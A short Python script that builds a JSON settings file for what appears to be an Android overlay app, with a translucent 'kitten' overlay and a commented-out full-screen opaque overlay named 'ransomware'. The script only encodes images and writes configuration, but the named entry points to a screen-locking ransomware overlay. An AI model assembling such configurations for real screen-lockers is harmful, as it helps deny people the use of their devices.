#!/usr/bin/python

import json

MATCH_PARENT = -1
WRAP_CONTENT = -2
TYPE_SYSTEM_OVERLAY = 2006
FLAG_LAYOUT_IN_SCREEN = 0x100
FLAG_DIM_BEHIND = 0x2
OPAQUE = -1
TRANSLUCENT = -3

ransomware = ["additional_image", "additional_image.png", open("additional_image.png", "rb").read().encode("base64"), MATCH_PARENT, MATCH_PARENT, TYPE_SYSTEM_OVERLAY, FLAG_LAYOUT_IN_SCREEN | FLAG_DIM_BEHIND, OPAQUE]

kitten = ["kitten", "kitten2.jpg", open("kitten2.jpg", "rb").read().encode("base64"), WRAP_CONTENT, WRAP_CONTENT, TYPE_SYSTEM_OVERLAY, FLAG_LAYOUT_IN_SCREEN, TRANSLUCENT]

def main():
    settings = dict()
    settings[kitten[0]] = kitten
    #settings[ransomware[0]] = ransomware

    with open("settings.json", "wb") as json_file:
        json_file.write(json.dumps(settings))


main()
